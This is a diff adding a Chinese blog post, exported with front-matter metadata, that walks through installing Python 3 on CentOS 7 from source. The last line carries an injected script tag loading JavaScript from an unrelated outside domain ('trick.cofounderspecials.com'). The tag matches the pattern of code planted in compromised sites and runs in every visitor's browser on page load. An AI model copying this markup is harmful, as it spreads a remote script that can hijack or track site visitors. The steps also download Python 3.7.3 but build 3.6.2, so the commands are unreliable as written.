@@ -1,0 +1,39 @@
+---
+layout: post
+title: Centos7 安装python3
+date: 2019-10-29 16:10:22.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Python
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2019/10/29/centos7-%e5%ae%89%e8%a3%85python3/"
+---
+<p class="p1"><b>首先安装依赖包</b></p>
+<p class="p2">yum -y groupinstall "Development tools"</p>
+<p class="p2">yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel</p>
+<p class="p2">然后根据自己需求下载不同版本的Python3，我下载的是Python3.7.3</p>
+<p class="p2">wget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tar.xz</p>
+<p class="p2">如果速度不够快，可以直接去官网下载，利用WinSCP等软件传到服务器上指定位置，我的存放目录是/usr/local/python3，使用命令：</p>
+<p class="p2">mkdir /usr/local/python3</p>
+<p class="p2">建立一个空文件夹</p>
+<p class="p2">然后解压压缩包，进入该目录，安装Python3</p>
+<p class="p2">tar -xvJf<span class="Apple-converted-space">  </span>Python-3.6.2.tar.xz</p>
+<p class="p2">cd Python-3.6.2</p>
+<p class="p2">./configure --prefix=/usr/local/python3</p>
+<p class="p2">make &amp;&amp; make install</p>
+<p class="p1"><b>最后创建软链接</b></p>
+<p class="p2">ln -s /usr/local/python3/bin/python3 /usr/bin/python3</p>
+<p class="p2">ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3</p>
+<p>在命令行中输入python3测试<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
